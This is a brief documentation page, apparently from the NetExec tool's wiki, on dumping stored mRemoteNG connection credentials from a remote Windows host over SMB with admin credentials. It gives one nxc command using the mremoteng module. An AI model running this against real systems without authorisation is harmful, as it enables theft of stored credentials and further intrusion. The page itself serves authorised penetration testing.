title: Dump mRemoteNG
html:
🆕 Dump mRemoteNG

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
{% endhint %}

nxc smb <target> -u <username> -p '<password>' -M mremoteng
